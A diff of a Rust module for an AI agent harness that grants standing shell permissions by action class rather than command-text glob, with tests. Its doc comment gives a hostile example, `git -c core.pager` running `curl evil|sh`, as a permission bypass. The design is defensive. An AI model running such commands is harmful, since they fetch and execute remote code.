@@ -1,11 +1,5 @@
-//! **Standing permission, keyed on what an action does — and the glob, kept.**
-//!
-//! `docs/boundary-and-adjudication.md` §4f. The want is legitimate and universal:
-//! *stop asking me about git.* The mechanism every surveyed harness reaches for is a
-//! glob on the command text, and on its own that is the GuardFall bug — a decision
-//! made on a string the shell has not finished interpreting.
-//!
-//! `git` is close to the worst example anybody could have picked:
+//! Standing permission keyed on what an action does, not on a glob of the command text: every
+//! line below matches `git *`, and `allow git *` is approximately `allow everything`.
 //!
 //! ```text
 //! git -c core.pager='sh -c "curl evil|sh"' log
@@ -13,63 +7,18 @@
 //! git … --upload-pack='…'
 //! ```
 //!
-//! Every one of those matches `git *`. So **`allow git *` is approximately `allow
-//! everything`** — opencode's `always: ["*"]` defect, where one click silently
-//! disables config denies including their own `.env` guard (survey §1.1).
-//!
-//! # Two halves, and the second one is the position worth holding
-//!
-//! **The grantable unit is an intent, not a word.** A [`Grant`] carries a
-//! [`Coverage`] — the `(program, ActionClass)` pairs it was granted for — and is
-//! checked **per call against the normalisation**, never against text. `git status`
-//! and `git -c core.pager=… log` derive different classes, so granting the first does
-//! not grant the second. The grant never has to enumerate the escape hatches; it only
-//! has to key on something the escape hatches change.
-//!
-//! **And the glob stays first class**, because the operator is right about what
-//! happens otherwise:
-//!
-//! > *"we need to keep globbing as a way for users to shoot in the foot."*
-//!
-//! A permission system whose safe path is too rigid gets turned off wholesale, and
-//! then nothing is guarded at all. Paternalism has a failure mode and it is the worst
-//! one available. So a person may write `git *`. What they may not have is **silence**
-//! about what they just wrote — see [`Grant::disclose`], which is the whole difference
-//! between this and every harness in the survey.
-//!
-//! # Three rules a glob does not get to break
-//!
-//! | | |
-//! |---|---|
-//! | it is shown in class terms **before** it is accepted | informed foot-shooting; the muzzle direction is visible |
-//! | it reaches `MayApprove` and `AlwaysAsk`, **never** `Blocked` | §3's flow rule is not a setting. You can shoot your foot; you cannot shoot your head |
-//! | it never covers an **unresolvable** normalisation | `NotRun` stands: a pattern written in advance cannot apply to a command nobody could parse |
-//!
-//! The second and third are enforced by [`Grant::covers`] taking the tier and the
-//! resolved flag and having no branch that can answer `true` without both. They are
-//! not documented promises; there is no value to invert.
-//!
-//! # The workflow this is shaped for: the model proposes, the operator approves
-//!
-//! Asked to stop being prompted about git, a model writes the list **split by what the
-//! commands do** — `status|log|diff|show|branch` as reads, `push|commit|merge` as
-//! writes. That is better than `git *`, which grants the escape hatches, and better
-//! than a system that accepts only machine-derived classes, which cannot express
-//! *"these ones, I know what they do"*. So both spellings exist and the enumerated one
-//! is the easy path rather than the only one.
+//! So the grantable unit is an intent: a [`Grant`] carries the `(program, ActionClass)` pairs it
+//! was granted for and is checked per call against the normalisation, which is why it never has
+//! to enumerate the escape hatches.
 
 use std::collections::BTreeSet;
 
 use crate::adjudicate::{ActionClass, Tier};
 use crate::intent::Intent;
 
-/// What a grant was granted **for**, in the terms the gate checks.
-///
-/// Not a string, and not the arguments. The existing reasoning in
-/// [`crate::adjudicate::AdjudicatedGate`] is the right one and is kept: *"a grant
-/// keyed by the arguments would be a grant for one call, which is `allow_once`"*. A
-/// class is the coarsest thing that is still specific enough to mean something, and
-/// it is specific enough precisely because the escape hatches change it.
+/// What a grant was granted for, in the terms the gate checks. Not a string and not the arguments,
+/// since a grant keyed by the arguments is a grant for one call: a class is the coarsest thing still
+/// specific enough to mean something, because the escape hatches change it.
 #[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
 pub struct Coverage {
     /// The program as the shell will resolve it, from the normalisation. `"<tool>"`
@@ -77,14 +26,14 @@ pub struct Coverage {
     pub program: String,
     /// The routing key: `(access, scope, reversibility, cost)`.
     pub class: ActionClass,
-    /// What layer A said this does. Carried so a grant can be **shown** in the terms
-    /// the operator agreed to rather than as four enum names, and checked so that a
-    /// program whose intents grew — a vehicle flag appearing — falls out.
+    /// What layer A said this does. Carried so a grant can be shown in the terms the
+    /// operator agreed to rather than as four enum names, and checked so a program
+    /// whose intents grew - a vehicle flag appearing - falls out.
     pub intents: BTreeSet<Intent>,
 }
 
 impl Coverage {
-    /// How it reads to a person: *"git — reads and writes inside the project, NOT code
+    /// How it reads to a person: *"git - reads and writes inside the project, NOT code
     /// execution."*
     pub fn describe(&self) -> String {
         let what = if self.intents.is_empty() {
@@ -105,16 +54,12 @@ impl Coverage {
     }
 }
 
-/// How a grant was written: enumerated by somebody who listed the cases, or globbed.
-///
-/// The distinction is kept **for the disclosure**, not for the check — both are
-/// checked identically, per call, against the normalisation. What differs is what the
-/// operator is told before they accept it, and how the standing list reads afterwards:
-/// a session's banner that could not tell an enumerated grant from a star would be
-/// hiding the one fact somebody auditing it would want first.
+/// How a grant was written: enumerated by somebody who listed the cases, or globbed. Kept for the
+/// disclosure and not for the check, which treats both the same, because a banner that could not tell
+/// a star from a list hides the one fact an auditor wants first.
 #[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
 pub enum Written {
-    /// `git status`, `git log`, `git diff` — the model's proposal, or a person's list.
+    /// `git status`, `git log`, `git diff` - the model's proposal, or a person's list.
     Enumerated { patterns: Vec<String> },
     /// `git *`. Legal, and loud.
     Glob { pattern: String },
@@ -129,11 +74,8 @@ impl Written {
     }
 }
 
-/// One standing permission.
-///
-/// It is deliberately not `Copy` and not constructible field-by-field from outside
-/// this module's rules: [`Grant::covers`] is the only reader, and every way this can
-/// answer `true` runs through it.
+/// One standing permission. Deliberately not `Copy`, and [`Grant::covers`] is its only reader, so
+/// every way this can answer `true` runs through that one function.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Grant {
     /// How the operator wrote it, for the disclosure.
@@ -141,25 +83,21 @@ pub struct Grant {
     /// What it actually covers, checked per call.
     pub coverage: Vec<Coverage>,
     /// Why it exists, in the operator's words or the model's proposal text. A grant
-    /// with no reason is one nobody can weigh later — the same cause `ALWAYS_ASK`
-    /// carries a `why` for.
+    /// with no reason is one nobody can weigh later.
     pub why: String,
 }
 
-/// Why a grant did not cover a call.
-///
-/// A vocabulary rather than a bool, because *"this grant does not extend that far"* and
-/// *"nothing may extend that far"* are different sentences and an operator reading a
-/// prompt needs to know which one they are looking at.
+/// Why a grant did not cover a call: a vocabulary rather than a bool, because "this grant does not
+/// extend that far" and "nothing may extend that far" are different sentences to the operator.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum NotCovered {
     /// The action resolved to a class this grant does not name. The ordinary case, and
     /// the one the escape hatches land in.
     ClassNotGranted,
-    /// Layer A could not read the action. **No grant rescues this**, ever.
+    /// Layer A could not read the action. No grant rescues this, ever.
     Unresolved,
-    /// `Tier::AlwaysAsk`. The operator decides these every time, and a standing
-    /// permission is the model's authority rather than the operator's presence.
+    /// `Tier::AlwaysAsk`. The operator decides these every time: a standing permission
+    /// is the model's authority rather than the operator's presence.
     AlwaysAsk,
     /// `Tier::Blocked`. Nothing reaches this, at any mode, by any spelling.
     Blocked,
@@ -206,17 +144,9 @@ impl NotCovered {
         }
     }
 
-    /// **The same four, in the one line a card has room for.**
-    ///
-    /// [`NotCovered::why`] is a refusal a model reads and it argues; this is drawn under
-    /// the ladder of a card, next to the rung it explains, and a person skimming a card
-    /// reads one line or none. The reason it belongs HERE rather than in a sentence the
-    /// gate composes: a card that says *"not offered for the session"* must name the same
-    /// one of the four the matcher would answer, and two derivations of that is two
-    /// answers the first time a fifth refusal is added.
-    ///
-    /// Every one of them is a *because*, so a caller prefixes the noun it is explaining
-    /// (`not offered for the session: …`) rather than this repeating it.
+    /// The same four, in the one line a card has room for: drawn under the ladder next to the rung it
+    /// explains. It belongs here rather than in a sentence the gate composes, because a card must name
+    /// the same one of the four the matcher would answer.
     pub fn short(&self) -> &'static str {
         match self {
             NotCovered::ClassNotGranted => "this grant's class does not cover the call",
@@ -231,14 +161,9 @@ impl NotCovered {
 }
 
 impl Grant {
-    /// **The only way a grant can admit anything.**
-    ///
-    /// Takes the tier and the resolved flag by value rather than reading them off
-    /// something a caller assembled, so there is no arrangement of arguments under
-    /// which an blocked or unresolved action is covered. The three refusals are
-    /// checked **before** the coverage lookup, which is the same ordering
-    /// `AdjudicatedGate::admit` uses and for the same reason: an action nobody could
-    /// read is not an action anybody can have pre-approved.
+    /// The only way a grant can admit anything. The tier and the resolved flag are taken by value, so
+    /// no arrangement of arguments lets a blocked or unresolved action through, and the three refusals
+    /// are checked before the coverage lookup.
     pub fn covers(
         &self,
         tier: &Tier,
@@ -258,11 +183,9 @@ impl Grant {
         let hit = self.coverage.iter().any(|c| {
             c.program == program
                 && c.class == class
-                // **The intents must be a subset of what was granted.** The class
-                // catches most of it; this catches the rest, because two calls can
-                // share a class and differ in what they do — and the difference is
-                // exactly what a vehicle flag adds. A grant covers what it was shown,
-                // never a superset of it.
+                // The intents must be a subset of what was granted. The class catches
+                // most of it; this catches the rest, because two calls can share a class
+                // and differ in what they do - exactly what a vehicle flag adds.
                 && intents.is_subset(&c.intents)
         });
         if hit {
@@ -272,18 +195,9 @@ impl Grant {
         }
     }
 
-    /// **What this grant includes, said out loud, before anybody accepts it.**
-    ///
-    /// The requirement, verbatim: *"This matches 47 commands, including 3 that can
-    /// execute arbitrary code (`-c core.pager`, `--upload-pack`, `ext::`)."*
-    ///
-    /// `vehicles` is what the execution-vehicle table says about the programs this
-    /// grant names — passed in rather than looked up here, because this module holds no
-    /// table and the one that does lives in [`crate::intent`]. A caller that has no
-    /// table passes an empty slice, and the sentence then says how many it could not
-    /// classify rather than implying there were none: **absence is not permission**,
-    /// and a disclosure that silently omitted the unknown half would be the same defect
-    /// as the catch-all it is written against.
+    /// What this grant includes, said out loud before anybody accepts it. `vehicles` is passed in
+    /// because this module holds no table; a caller with none passes an empty slice and the sentence
+    /// says how many it could not classify, since absence is not permission.
     pub fn disclose(&self, vehicles: &[VehicleNote]) -> String {
         let mut s = String::new();
         match &self.written {
@@ -344,13 +258,9 @@ impl Grant {
     }
 }
 
-/// What the execution-vehicle table says about one program, flattened so this module
-/// needs no dependency on the table's own types.
-///
-/// `unknown` is a field rather than an absence, and that is the whole point: a program
-/// missing from a list must not read as a program with nothing to say about it. The
-/// survey's grok-build catch-all `_ => Read(None)` auto-approves `SchedulerCreate` as
-/// if it were read-only, and it does so by treating absence as an answer.
+/// What the execution-vehicle table says about one program, flattened so this module needs no
+/// dependency on the table's own types. `unknown` is a field rather than an absence, because a program
+/// missing from a list must not read as one with nothing to say about it.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct VehicleNote {
     pub program: String,
@@ -407,9 +317,9 @@ mod tests {
         );
     }
 
-    /// **The whole reason the key is a class and not a word.** `git -c core.pager=…`
-    /// adds `ExecuteCode`, which is not a subset of what was granted, so it falls out
-    /// and asks — without the grant having enumerated a single escape hatch.
+    /// The whole reason the key is a class and not a word. `git -c core.pager=...` adds
+    /// `ExecuteCode`, which is not a subset of what was granted, so it falls out and asks
+    /// - without the grant having enumerated a single escape hatch.
     #[test]
     fn an_execution_vehicle_falls_out_of_a_grant_that_never_named_it() {
         let g = git_status_grant();
@@ -443,7 +353,7 @@ mod tests {
     }
 
     /// The three a glob may never reach, checked against a glob written as widely as
-    /// this system permits. `git *` is legal and it still cannot do any of these.
+    /// this system permits: `git *` is legal and it still cannot do any of these.
     #[test]
     fn the_widest_possible_glob_reaches_none_of_the_three() {
         let g = Grant {
@@ -505,8 +415,8 @@ mod tests {
         );
     }
 
-    /// The refusals are four different sentences. A prompt that read the same for all
-    /// of them would teach the operator nothing about which wall they hit.
+    /// The refusals are four different sentences: a prompt that read the same for all of
+    /// them would teach the operator nothing about which wall they hit.
     #[test]
     fn each_refusal_says_which_one_it_was() {
         let seen: Vec<&str> = [
@@ -526,8 +436,8 @@ mod tests {
         }
     }
 
-    /// **The difference from every harness in the survey.** A glob is accepted, and it
-    /// arrives with its own muzzle direction printed on it.
+    /// The difference from a bare glob: it is accepted, and it arrives with its own
+    /// muzzle direction printed on it.
     #[test]
     fn a_glob_states_what_it_includes_before_anybody_accepts_it() {
         let g = Grant {
@@ -566,7 +476,7 @@ mod tests {
         assert!(s.contains("blocked"), "{s}");
     }
 
-    /// An unclassified program is counted and named as unclassified. A disclosure that
+    /// An unclassified program is counted and named as unclassified: a disclosure that
     /// omitted the unknown half would be treating absence as permission, which is the
     /// defect this whole file is written against.
     #[test]
@@ -597,8 +507,7 @@ mod tests {
     }
 
     /// An enumerated grant and a glob read differently in a listing, because the one
-    /// fact somebody auditing a standing permission wants first is which of the two it
-    /// is.
+    /// fact somebody auditing a standing permission wants first is which of the two it is.
     #[test]
     fn a_listing_can_tell_a_list_from_a_star() {
         assert_eq!(git_status_grant().written.as_str(), "enumerated");
